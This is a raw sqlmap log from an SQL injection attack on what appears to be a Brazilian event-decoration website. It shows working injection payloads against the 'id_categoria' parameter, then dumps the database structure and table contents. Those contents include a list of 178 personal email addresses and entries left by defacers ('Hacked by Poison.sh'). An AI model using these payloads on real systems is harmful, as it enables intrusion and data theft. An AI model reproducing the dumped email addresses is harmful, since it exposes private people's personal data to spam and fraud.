@@ -1,0 +1,1118 @@
+sqlmap identified the following injection point(s) with a total of 195 HTTP(s) requests:
+---
+Parameter: id_categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_categoria=1 AND 7644=7644
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id_categoria=1 AND (SELECT 4951 FROM(SELECT COUNT(*),CONCAT(0x7178627871,(SELECT (ELT(4951=4951,1))),0x7170767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_categoria=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] astridde_astrid
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_categoria=1 AND 7644=7644
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id_categoria=1 AND (SELECT 4951 FROM(SELECT COUNT(*),CONCAT(0x7178627871,(SELECT (ELT(4951=4951,1))),0x7170767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_categoria=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: astridde_astrid
+[18 tables]
++----------------------+
+| local                |
+| cadastro             |
+| cores                |
+| emails               |
+| evento               |
+| foto                 |
+| foto_estilo          |
+| imagem               |
+| imagem_cores         |
+| imagem_gostei        |
+| imagem_local         |
+| imagem_segmento      |
+| imagem_tags          |
+| login                |
+| segmentos_principais |
+| slide_home           |
+| tags                 |
+| visitas              |
++----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_categoria=1 AND 7644=7644
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id_categoria=1 AND (SELECT 4951 FROM(SELECT COUNT(*),CONCAT(0x7178627871,(SELECT (ELT(4951=4951,1))),0x7170767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_categoria=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: astridde_astrid
+[18 tables]
++----------------------+
+| local                |
+| cadastro             |
+| cores                |
+| emails               |
+| evento               |
+| foto                 |
+| foto_estilo          |
+| imagem               |
+| imagem_cores         |
+| imagem_gostei        |
+| imagem_local         |
+| imagem_segmento      |
+| imagem_tags          |
+| login                |
+| segmentos_principais |
+| slide_home           |
+| tags                 |
+| visitas              |
++----------------------+
+
+Database: astridde_astrid
+Table: local
+[2 entries]
++----+----------------------+
+| id | nome                 |
++----+----------------------+
+| 11 | Hacked E3            |
+| 12 | Hacked by Poison.sh  |
++----+----------------------+
+
+Database: astridde_astrid
+Table: cadastro
+[178 entries]
++-----+--------------------------------------+
+| id  | email                                |
++-----+--------------------------------------+
+| 1   | francisco.assis@tanda.com.br         |
+| 2   | contato@microfobia.com.br            |
+| 3   | anittagallo@anittagallo.com.br       |
+| 4   | cileize@yahoo.com.br                 |
+| 5   | abebalarmes@uol.com.br               |
+| 6   | acabamento@lencospresidente.com.br   |
+| 7   | albanoborges@uol.com.br              |
+| 8   | alebottcher@yahoo.com.br             |
+| 9   | alecfelix@ig.com.br                  |
+| 10  | alenunes@mcnet.com.br                |
+| 11  | alepessin@hotmail.com                |
+| 12  | alerigueraia@hotmail.com             |
+| 13  | alesou21@click21.com.br              |
+| 14  | alessandrobarao@uol.com.br           |
+| 15  | alessandrolmonteiro@gmail.com        |
+| 16  | alex.roda@ig.com.br                  |
+| 17  | alexandra@vitoriahoteis.com.br       |
+| 18  | alexandre.zaneli@ig.com.br           |
+| 19  | alexandre@webvice.com.br             |
+| 20  | alexandre_vl@yahoo.com.br            |
+| 21  | alexandre17@uol.com.br               |
+| 22  | alexandrecampostv@hotmail.com        |
+| 23  | alexandregozzi@uol.com.br            |
+| 24  | alexandremaromini@ig.com.br          |
+| 25  | alguimazo@hoymail.com                |
+| 26  | aline.feq@gamil.com                  |
+| 27  | aline.jms@gmail.com                  |
+| 28  | aline_info@hotmail.com               |
+| 29  | aline_mc@hotmail.com                 |
+| 30  | aline_moretto@yahoo.com.br           |
+| 31  | aline_santos@hotmail.com             |
+| 32  | alinecosta18@hotmail.com             |
+| 33  | alinedan.nutri@yahoo.com.br          |
+| 34  | alinedqi@hotmail.com                 |
+| 35  | alinedroza@gmail.com                 |
+| 36  | alinekimie@yahoo.com.br              |
+| 37  | alinemoretti@hotmail.com             |
+| 38  | alineppcampos@yahoo.com.br           |
+| 39  | alinerbernardino@hotmail.com         |
+| 40  | alinerocha1994@yahoo.com.br          |
+| 41  | alinerossy@hotmail.com               |
+| 42  | alinesal28@hotmail.com               |
+| 43  | alinescaloniq@gmail.com              |
+| 44  | alineschettini@hotmail.com           |
+| 45  | alinesmoreira@gmail.com              |
+| 46  | alinessa1@yahoo.com.br               |
+| 47  | allimacleandra@hotmail.com           |
+| 48  | almeida_regina@yahoo.com.br          |
+| 49  | almir_1971@yahoo.com.br              |
+| 50  | almorais14@hotmail.com.br            |
+| 51  | alps27@hotmail.com                   |
+| 52  | altec@altecbtp.com.br                |
+| 53  | aluguel@supportfestas.com.br         |
+| 54  | aluiziosjr@ig.com.br                 |
+| 55  | alves_1968@yahoo.com.br              |
+| 56  | amagalhaescampos@yahoo.com.br        |
+| 57  | amanda.santos@hotmail.com            |
+| 58  | amanda.silva@mrv.com.br              |
+| 59  | amanda.teixeira@fnc-ag.com           |
+| 60  | amandamascardi@gmail.com.br          |
+| 61  | amanditawebentom@hotmail.com.br      |
+| 62  | amandritari@hotmail.com              |
+| 63  | amapaschoalino@yahoo.com.br          |
+| 64  | amaurifilho@scalet.com.br            |
+| 65  | ame_carolyne95@hotmail.com           |
+| 66  | ameliaelegante@terra.com.br          |
+| 67  | americocoimbra@uol.com.br            |
+| 68  | amrquinho_aurelio@terra.com.br       |
+| 69  | amuterle@yahoo.com.br                |
+| 70  | ana.cherdnin@ig.com                  |
+| 71  | ana.claudia@eucatex.com.br           |
+| 72  | ana.favris@bol.com.br                |
+| 73  | ana.oliveuira@orga.com.br            |
+| 74  | ana.psy@hotmail.com                  |
+| 75  | ana.valsechi@givandon.com            |
+| 76  | ana@saviezza.com.br                  |
+| 77  | ana_aalmeida@hotmail.com             |
+| 78  | ana_cristina_barreto@hotmail.com     |
+| 79  | ana_cruz@prancur.com                 |
+| 80  | ana_paltri@yahoo.com.br              |
+| 81  | ana_paula_oliva@yahoo.com.br         |
+| 82  | ana_rodrigues@hotmail.com            |
+| 83  | anabui@ig.com.br                     |
+| 84  | anacarolina_fgarcia@yahoo.com.br     |
+| 85  | anacarpentieri@yahoo.com             |
+| 86  | anaclaudia@cit.com.br                |
+| 87  | anacris_acp@yahoo.com.br             |
+| 88  | anadecandola@ig.com.br               |
+| 89  | anafabiano@terra.com.br              |
+| 90  | anafanton@hotmail.com                |
+| 91  | anaflavia_salgado@yahoo.com.br       |
+| 92  | anafreitaspelatti@hotmail.com        |
+| 93  | anagrn@ig.com.br                     |
+| 94  | anahamaral@signanet.com.br           |
+| 95  | anaigb2@hotmail.com                  |
+| 96  | anakel@anakel.com.br                 |
+| 97  | analaura_minatil@hotmail.com         |
+| 98  | anamalia@gmaiol.com                  |
+| 99  | anamenegatto@gmail.com               |
+| 100 | anammasscaara@yahoo.com.br           |
+| 101 | anapalonso@yahoo.com.br              |
+| 102 | anapaula_enfa@bol.com.br             |
+| 103 | anapaula_padovani@yahoo.com.br       |
+| 104 | anapaula2006@hotmail.com             |
+| 105 | anapaulacastro@ems.com.br            |
+| 106 | anapauladelrio@hotmail.com           |
+| 107 | anapaulalorenzan@gmail.com           |
+| 108 | anapaulaquintela@yahoo.com.br        |
+| 109 | anapaulasavioli@gmail.com            |
+| 110 | anbicudo@yahoo.com.br                |
+| 111 | anderson.cesar2004@ig.com.br         |
+| 112 | anderson_planejamento@hotmail.com    |
+| 113 | andhi13@hotmail.com                  |
+| 114 | andinho_mai@hotmail.com              |
+| 115 | andrade.graziela@yahoo.com.br        |
+| 116 | andre.campana@terra.com.br           |
+| 117 | andre_fc_silva@hotmail.com           |
+| 118 | andre4688@terra.com.br               |
+| 119 | andrea.anastacio@gmail.com           |
+| 120 | andrea_peres@hotmail.com             |
+| 121 | andreafigueiraf@bd.com.br            |
+| 122 | andreavillela@yahoo.com.br           |
+| 123 | andreia.fregato@gmail.com            |
+| 124 | andreia_johnwesley07@cyahoo.com.br   |
+| 125 | andreia_percia84@ig.com.br           |
+| 126 | andreiamscruz@yahoo.com              |
+| 127 | andrejberenguel@yahoo.com.br         |
+| 128 | andremoreira_am@yahoo.com.br         |
+| 129 | andremurarolli@terra.com             |
+| 130 | andrepadilha@gmail.com               |
+| 131 | andressa.cpq@gmail.com               |
+| 132 | andressa.laranja@yahoo.com           |
+| 133 | andressa_cls@hotmail.com             |
+| 134 | andressabatista@hotmail.com          |
+| 135 | andressadias@hotmail.com             |
+| 136 | andressarous@yahoo.com.br            |
+| 137 | andrevanini@yahoo.com.br             |
+| 138 | andrevincitore@yahoo.com.br          |
+| 139 | andrezafrizani@yahoo.com             |
+| 140 | andsmaile@yahoo.com.br               |
+| 141 | andy_guiga@yahoo.com.br              |
+| 142 | andyrpgt@yahoo.com.br                |
+| 143 | anelita@bol.com.br                   |
+| 144 | anfernandes@pop.com.br               |
+| 145 | angel@sugarangel.com.br              |
+| 146 | angela.barbisan@hotmail.com          |
+| 147 | angela.barros@terra.com.br           |
+| 148 | angela.fernandes@souzacruz.com.br    |
+| 149 | angela.odont@gmail.com               |
+| 150 | angela_artesa@hotmail.com            |
+| 151 | angeladimuzio@yahoo.com.br           |
+| 152 | angelagiananini@bol.com.br           |
+| 153 | angelanaldigatti@yahoo.com.br        |
+| 154 | angelapiloni@gmail.com               |
+| 155 | angelavillaca@hotmail.com            |
+| 156 | angelica-a-costa@yahoo.com.br        |
+| 157 | angelicapyles@mac.com.br             |
+| 158 | aniancaeci@hotmail.com               |
+| 159 | anibal.carvalho@gmail.com            |
+| 160 | aninha_hunzl@bol.com.br              |
+| 161 | anitaf.borges@yahoo.com.br           |
+| 162 | anna.silva07@gmail.com               |
+| 163 | annamateo@annamateo.com.br           |
+| 164 | annavcvicentim@gmail.com             |
+| 165 | anne.laureano@itelefonica.com.br     |
+| 166 | anne_schnell@hotmail.com             |
+| 167 | anrdepmonteiro@hotmail.com           |
+| 168 | antiproblemas@uol.com.br             |
+| 169 | antonio.cabelo@hotmail.com           |
+| 170 | antonio.giaretta@poli.usp.br         |
+| 171 | antonio.pacheco@terra.com.br         |
+| 172 | antonio_an@hotmail.com               |
+| 173 | antoniofotografo@portalimagem.com.br |
+| 174 | antoniooliveira@gmail.com            |
+| 175 | anystrazzacappa@yahoo.com.br         |
+| 176 | aoribeiro@hotmail.com                |
+| 177 | apbatisti@hotmail.com                |
+| 178 | apsbaganha@hotmail.com               |
++-----+--------------------------------------+
+
+Database: astridde_astrid
+Table: cores
+[15 entries]
++----+--------------+
+| id | nome         |
++----+--------------+
+| 1  | p&b          |
+| 2  | branco       |
+| 3  | preto        |
+| 4  | cinza        |
+| 5  | verde        |
+| 6  | amarelo      |
+| 7  | laranja      |
+| 8  | marrom       |
+| 9  | roxo         |
+| 10 | azul         |
+| 11 | azul claro   |
+| 12 | rosa/violeta |
+| 13 | vermelho     |
+| 14 | dourado      |
+| 15 | prata        |
++----+--------------+
+
+Database: astridde_astrid
+Table: emails
+[2 entries]
++------------+-------+--------+--------+-----------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+
+| data       | ativo | numero | codigo | assunto         | conteudo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | dataEnviar |
++------------+-------+--------+--------+-----------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+
+| 2008-11-10 | 1     | 844    | 1      | Lançamento Site | <html>\r\n<head>\r\n<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\r\n<title>:: Astrid Decor ::</title>\r\n</head>\r\n\r\n<body bgcolor="#D3D2B4">\r\n<table width="100%" height="100%">\r\n\t<tr>\r\n\t\t<td align="center"><img src="http://www.astriddecor.com.br/apresentacao/astrid.jpg" border="0" usemap="#Map"></td>\r\n\t</tr>\r\n</table>\r\n\r\n<map name="Map"><area shape="rect" coords="334,170,538,196" href="http://www.astriddecor.com.br" target="_blank">\r\n</map></body>\r\n</html>                                                                                                                                                                                                                                                                                      | 11/11/2008 |
+| 2008-12-13 | 1     | 101    | 2      | Feliz 2009!     | <html>\r\n<head>\r\n<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\r\n<title>:: Astrid Decor ::</title>\r\n<style type="text/css">\r\n<!--\r\nbody {\r\n\tbackground-color: #D1D0B1;\r\n\tbackground-image: url(http://www.astriddecor.com.br/emkt/fda2009/bg.png);\r\n\tbackground-repeat: repeat;\r\n\tmargin-left: 0px;\r\n\tmargin-top: 0px;\r\n\tmargin-right: 0px;\r\n\tmargin-bottom: 0px;\r\n}\r\n-->\r\n</style></head>\r\n\r\n<body>\r\n<table border="0" cellpadding="0" cellspacing="0" width="100%" height="100%">\r\n\t<tr>\r\n\t\t<td align="center" valign="middle">\r\n\t\t\t<a href="http://www.astriddecor.com.br" target="_blank"><img src="http://www.astriddecor.com.br/emkt/fda2009/img.jpg" border="0"></a>\r\n\t\t</td>\r\n\t</tr>\r\n</table>\r\n</body>\r\n</html> | 16/12/2008 |
++------------+-------+--------+--------+-----------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+
+
+Database: astridde_astrid
+Table: evento
+[10 entries]
++-----------+------------------------------------+-------------+-----------------------------+-----------------------------------------------+
+| evento_id | evento_tit                         | evento_data | evento_local                | evento_texto                                  |
++-----------+------------------------------------+-------------+-----------------------------+-----------------------------------------------+
+| 8         | Recepção de Sede Clube de Campo    | 2008-10-24  | Clube de Campo              | Decoração                                     |
+| 9         | Recepção Casarão da Fazenda        | 2008-10-24  | Fazenda Santa Gertrudes     | Decoração                                     |
+| 15        | Casamento Campestre                | 2009-02-18  | teste                       | <blank>                                       |
+| 16        | Recepção Rosa                      | 2009-01-24  | <blank>                     | <blank>                                       |
+| 20        | MATRIZ DE PAULINIA                 | 2009-09-19  | MATRIZ DE PAULINIA          | <blank>                                       |
+| 21        | THE ROYAL PALM PLAZA - GRAMADO     | 2009-10-24  | Gramado                     | Cerimonia Religiosa                           |
+| 23        | THE ROYAL PALM PLAZA - SALÃO       | 2009-10-24  | Salão Hibisco               | Jantar                                        |
+| 24        | ANGELINOS BUFFET -THIAGO E MARIANA | 2011-02-03  | GYGABYTE - BETEL            | <blank>                                       |
+| 25        | BAILE NA HIPICA                    | 0000-00-00  | Sociedade Hipica Campinaira | Decoração em Vermelho                         |
+| 26        | ZANZARA - Lilás                    | 2011-10-29  | Espaço Zanzara              | O Ambiente Mágico para o Sonho que se Realiza |
++-----------+------------------------------------+-------------+-----------------------------+-----------------------------------------------+
+
+Database: astridde_astrid
+Table: foto
+[18 entries]
++---------+-----------+-----+
+| foto_id | evento_id | img |
++---------+-----------+-----+
+| 1       | 1         | jpg |
+| 3       | 3         | jpg |
+| 5       | 5         | jpg |
+| 6       | 6         | jpg |
+| 7       | 7         | jpg |
+| 10      | 4         | jpg |
+| 11      | 10        | jpg |
+| 12      | 10        | jpg |
+| 18      | 8         | jpg |
+| 19      | 8         | jpg |
+| 24      | 8         | jpg |
+| 27      | 8         | jpg |
+| 29      | 8         | jpg |
+| 30      | 8         | jpg |
+| 39      | 2         | jpg |
+| 40      | 2         | jpg |
+| 41      | 2         | jpg |
+| 42      | 12        | jpg |
++---------+-----------+-----+
+
+Database: astridde_astrid
+Table: foto_estilo
+[15 entries]
++-----------+----------------+-----+
+| estilo_id | foto_estilo_id | img |
++-----------+----------------+-----+
+| 1         | 102            | jpg |
+| 1         | 105            | jpg |
+| 1         | 105            | jpg |
+| 1         | 109            | jpg |
+| 1         | 113            | jpg |
+| 1         | 101            | jpg |
+| 2         | 120            | jpg |
+| 2         | 120            | jpg |
+| 2         | 217            | jpg |
+| 2         | 217            | jpg |
+| 2         | 189            | jpg |
+| 2         | 217            | jpg |
+| 2         | 217            | jpg |
+| 2         | 194            | jpg |
+| 2         | 189            | jpg |
++-----------+----------------+-----+
+
+Database: astridde_astrid
+Table: imagem
+[5 entries]
++----+-----------+-------------------------------------------------------------------------------------------------------------------------+-------------------------------+-------------------------------------+-------------------------------+---------------------------------------------+
+| id | nome      | descricao                                                                                                               | imagem174x116                 | imagem960x420                       | imagem225x133                 | caminho_imagem                              |
++----+-----------+-------------------------------------------------------------------------------------------------------------------------+-------------------------------+-------------------------------------+-------------------------------+---------------------------------------------+
+| 1  | Bouquet   | Bouquet lindos para o seu casamento.                                                                                    | 174x116/astrid_94810.jpg      | 960x420/novo_astrid_94810.jpg       | 225x133/novo_astrid_94810.jpg | imagens/astrid_94810.jpg                    |
+| 2  | Casamento | Casamento realizado na Kratos Eventos<br />\r\nEstrada da Capela, 501 / Bairro Casa Verde 13280-000 Vinhedo (São Paulo) | 174x116/novo_astrid_19073.jpg | 960x420/novo_astrid_19073.jpg       |                               | marca//29dd78fdfcd5ffe7e2662be29512fa0b.jpg |
+| 4  | Casamento | Casamento na Kratos em Vinhedo<br />\r\nEstrada da Capela, 501 / Bairro Casa Verde 13280-000 Vinhedo (São Paulo)        | 174x116/novo_astrid_53236.jpg | upload_pic/thumbnail_1415128983.jpg |                               | marca//f8b9168dee0e5cbc0b5648271a3e51a4.jpg |
+| 5  |           | Cerimônia                                                                                                               | 174x116/astrid_15485.jpg      | 960x420/novo_astrid_15485.jpg       | 225x133/novo_astrid_15485.jpg | marca//2aa62ae00591d09de25f6d976e69fa42.jpg |
+| 7  |           | Casamento                                                                                                               | 174x116/astrid_65282.jpg      | 960x420/novo_astrid_65282.jpg       | 225x133/novo_astrid_65282.jpg | marca//a63f3115125535e6f389bced8145bbfe.jpg |
++----+-----------+-------------------------------------------------------------------------------------------------------------------------+-------------------------------+-------------------------------------+-------------------------------+---------------------------------------------+
+
+Database: astridde_astrid
+Table: imagem_cores
+[335 entries]
++-----+--------+-----------+
+| id  | id_cor | id_imagem |
++-----+--------+-----------+
+| 196 | 2      | 4         |
+| 197 | 8      | 4         |
+| 203 | 2      | 2         |
+| 204 | 3      | 2         |
+| 205 | 8      | 2         |
+| 206 | 9      | 2         |
+| 207 | 10     | 2         |
+| 224 | 2      | 19        |
+| 225 | 13     | 19        |
+| 226 | 2      | 20        |
+| 227 | 8      | 20        |
+| 228 | 13     | 20        |
+| 229 | 2      | 21        |
+| 230 | 8      | 21        |
+| 231 | 12     | 21        |
+| 232 | 13     | 21        |
+| 233 | 2      | 23        |
+| 234 | 13     | 23        |
+| 240 | 2      | 26        |
+| 241 | 12     | 26        |
+| 250 | 2      | 32        |
+| 251 | 3      | 32        |
+| 252 | 4      | 32        |
+| 256 | 2      | 34        |
+| 257 | 4      | 34        |
+| 260 | 2      | 36        |
+| 261 | 4      | 36        |
+| 264 | 2      | 37        |
+| 265 | 4      | 37        |
+| 266 | 2      | 38        |
+| 267 | 4      | 38        |
+| 273 | 2      | 41        |
+| 274 | 4      | 41        |
+| 275 | 12     | 41        |
+| 285 | 2      | 40        |
+| 286 | 4      | 40        |
+| 287 | 12     | 40        |
+| 310 | 2      | 45        |
+| 311 | 12     | 45        |
+| 314 | 2      | 47        |
+| 315 | 12     | 47        |
+| 316 | 2      | 48        |
+| 317 | 13     | 48        |
+| 318 | 2      | 49        |
+| 319 | 13     | 49        |
+| 320 | 2      | 50        |
+| 321 | 3      | 50        |
+| 322 | 12     | 50        |
+| 333 | 2      | 59        |
+| 335 | 2      | 61        |
+| 336 | 2      | 62        |
+| 337 | 5      | 62        |
+| 338 | 13     | 62        |
+| 351 | 7      | 67        |
+| 352 | 7      | 68        |
+| 354 | 12     | 70        |
+| 355 | 9      | 71        |
+| 356 | 12     | 71        |
+| 373 | 13     | 73        |
+| 374 | 12     | 74        |
+| 375 | 6      | 75        |
+| 376 | 7      | 75        |
+| 377 | 8      | 75        |
+| 379 | 12     | 77        |
+| 380 | 6      | 78        |
+| 381 | 12     | 78        |
+| 382 | 2      | 63        |
+| 383 | 5      | 63        |
+| 384 | 13     | 63        |
+| 388 | 2      | 66        |
+| 389 | 5      | 66        |
+| 390 | 13     | 66        |
+| 391 | 2      | 16        |
+| 392 | 5      | 16        |
+| 393 | 6      | 16        |
+| 394 | 7      | 16        |
+| 395 | 2      | 17        |
+| 396 | 5      | 17        |
+| 397 | 6      | 17        |
+| 398 | 7      | 17        |
+| 419 | 2      | 18        |
+| 420 | 5      | 18        |
+| 421 | 6      | 18        |
+| 422 | 7      | 18        |
+| 423 | 2      | 14        |
+| 424 | 5      | 14        |
+| 425 | 6      | 14        |
+| 426 | 7      | 14        |
+| 427 | 2      | 51        |
+| 428 | 2      | 52        |
+| 429 | 13     | 79        |
+| 430 | 13     | 80        |
+| 431 | 13     | 81        |
+| 432 | 6      | 82        |
+| 433 | 8      | 82        |
+| 434 | 13     | 82        |
+| 435 | 6      | 83        |
+| 436 | 7      | 83        |
+| 437 | 8      | 83        |
+| 438 | 13     | 83        |
+| 443 | 6      | 85        |
+| 444 | 7      | 85        |
+| 445 | 8      | 85        |
+| 446 | 13     | 85        |
+| 451 | 6      | 87        |
+| 452 | 7      | 87        |
+| 453 | 13     | 87        |
+| 457 | 6      | 89        |
+| 458 | 7      | 89        |
+| 459 | 8      | 89        |
+| 460 | 13     | 89        |
+| 461 | 6      | 90        |
+| 462 | 7      | 90        |
+| 463 | 8      | 90        |
+| 464 | 13     | 90        |
+| 465 | 6      | 91        |
+| 466 | 7      | 91        |
+| 467 | 8      | 91        |
+| 468 | 13     | 91        |
+| 469 | 6      | 92        |
+| 470 | 7      | 92        |
+| 471 | 8      | 92        |
+| 472 | 13     | 92        |
+| 473 | 2      | 93        |
+| 474 | 6      | 93        |
+| 476 | 6      | 95        |
+| 477 | 8      | 95        |
+| 478 | 7      | 96        |
+| 479 | 8      | 96        |
+| 480 | 6      | 97        |
+| 481 | 2      | 98        |
+| 482 | 6      | 98        |
+| 483 | 2      | 99        |
+| 484 | 6      | 99        |
+| 485 | 2      | 100       |
+| 486 | 6      | 100       |
+| 487 | 2      | 101       |
+| 488 | 5      | 101       |
+| 489 | 7      | 101       |
+| 493 | 6      | 103       |
+| 494 | 9      | 104       |
+| 495 | 12     | 104       |
+| 496 | 9      | 105       |
+| 497 | 12     | 105       |
+| 498 | 9      | 106       |
+| 499 | 12     | 106       |
+| 500 | 9      | 107       |
+| 501 | 12     | 107       |
+| 502 | 9      | 108       |
+| 503 | 12     | 108       |
+| 506 | 9      | 110       |
+| 507 | 12     | 110       |
+| 510 | 9      | 112       |
+| 511 | 12     | 112       |
+| 512 | 9      | 113       |
+| 513 | 12     | 113       |
+| 514 | 9      | 114       |
+| 515 | 12     | 114       |
+| 518 | 9      | 116       |
+| 519 | 12     | 116       |
+| 520 | 9      | 117       |
+| 521 | 12     | 117       |
+| 523 | 2      | 119       |
+| 525 | 2      | 121       |
+| 526 | 8      | 121       |
+| 529 | 2      | 123       |
+| 530 | 2      | 124       |
+| 531 | 2      | 125       |
+| 532 | 2      | 126       |
+| 533 | 12     | 127       |
+| 534 | 12     | 128       |
+| 535 | 12     | 129       |
+| 536 | 12     | 130       |
+| 537 | 2      | 131       |
+| 538 | 8      | 132       |
+| 539 | 7      | 133       |
+| 541 | 2      | 135       |
+| 542 | 2      | 136       |
+| 543 | 6      | 136       |
+| 544 | 2      | 137       |
+| 545 | 6      | 137       |
+| 548 | 2      | 139       |
+| 549 | 6      | 139       |
+| 550 | 12     | 139       |
+| 551 | 2      | 140       |
+| 552 | 6      | 140       |
+| 553 | 12     | 140       |
+| 557 | 2      | 142       |
+| 558 | 6      | 142       |
+| 559 | 12     | 142       |
+| 563 | 2      | 144       |
+| 564 | 6      | 144       |
+| 565 | 12     | 144       |
+| 566 | 7      | 145       |
+| 567 | 9      | 145       |
+| 568 | 12     | 145       |
+| 573 | 12     | 148       |
+| 574 | 12     | 149       |
+| 576 | 11     | 151       |
+| 577 | 12     | 152       |
+| 580 | 6      | 155       |
+| 581 | 7      | 155       |
+| 584 | 2      | 157       |
+| 585 | 14     | 157       |
+| 590 | 2      | 159       |
+| 600 | 2      | 164       |
+| 601 | 9      | 164       |
+| 602 | 12     | 164       |
+| 603 | 2      | 165       |
+| 606 | 2      | 168       |
+| 607 | 2      | 169       |
+| 608 | 2      | 170       |
+| 609 | 2      | 171       |
+| 638 | 2      | 24        |
+| 639 | 13     | 24        |
+| 642 | 2      | 179       |
+| 643 | 2      | 180       |
+| 645 | 2      | 182       |
+| 646 | 2      | 183       |
+| 647 | 2      | 184       |
+| 648 | 2      | 185       |
+| 649 | 6      | 185       |
+| 650 | 14     | 185       |
+| 666 | 2      | 191       |
+| 667 | 6      | 191       |
+| 668 | 14     | 191       |
+| 678 | 2      | 195       |
+| 679 | 6      | 195       |
+| 680 | 14     | 195       |
+| 681 | 2      | 196       |
+| 682 | 6      | 196       |
+| 687 | 2      | 65        |
+| 688 | 5      | 65        |
+| 689 | 13     | 65        |
+| 693 | 2      | 64        |
+| 694 | 5      | 64        |
+| 695 | 13     | 64        |
+| 696 | 2      | 199       |
+| 700 | 2      | 203       |
+| 701 | 2      | 204       |
+| 703 | 2      | 206       |
+| 704 | 6      | 206       |
+| 709 | 2      | 209       |
+| 710 | 6      | 209       |
+| 713 | 6      | 211       |
+| 714 | 6      | 212       |
+| 715 | 12     | 213       |
+| 716 | 12     | 214       |
+| 717 | 2      | 215       |
+| 718 | 12     | 215       |
+| 719 | 2      | 216       |
+| 720 | 12     | 216       |
+| 721 | 13     | 216       |
+| 725 | 2      | 218       |
+| 726 | 12     | 219       |
+| 728 | 12     | 221       |
+| 729 | 12     | 222       |
+| 731 | 12     | 224       |
+| 732 | 12     | 225       |
+| 733 | 12     | 226       |
+| 738 | 2      | 230       |
+| 739 | 10     | 230       |
+| 740 | 2      | 231       |
+| 741 | 10     | 231       |
+| 746 | 6      | 69        |
+| 747 | 7      | 69        |
+| 748 | 2      | 42        |
+| 749 | 7      | 27        |
+| 750 | 7      | 1         |
+| 751 | 7      | 72        |
+| 752 | 6      | 43        |
+| 753 | 2      | 44        |
+| 754 | 2      | 202       |
+| 755 | 2      | 166       |
+| 756 | 2      | 30        |
+| 757 | 2      | 232       |
+| 758 | 2      | 233       |
+| 759 | 6      | 234       |
+| 760 | 10     | 234       |
+| 761 | 12     | 234       |
+| 762 | 12     | 235       |
+| 763 | 6      | 236       |
+| 764 | 7      | 236       |
+| 765 | 2      | 237       |
+| 771 | 2      | 238       |
+| 772 | 9      | 239       |
+| 773 | 12     | 239       |
+| 774 | 2      | 240       |
+| 775 | 9      | 240       |
+| 776 | 12     | 240       |
+| 777 | 2      | 241       |
+| 778 | 6      | 241       |
+| 779 | 9      | 241       |
+| 780 | 12     | 241       |
+| 781 | 2      | 242       |
+| 782 | 12     | 242       |
+| 783 | 15     | 242       |
+| 784 | 2      | 243       |
+| 785 | 12     | 243       |
+| 786 | 15     | 243       |
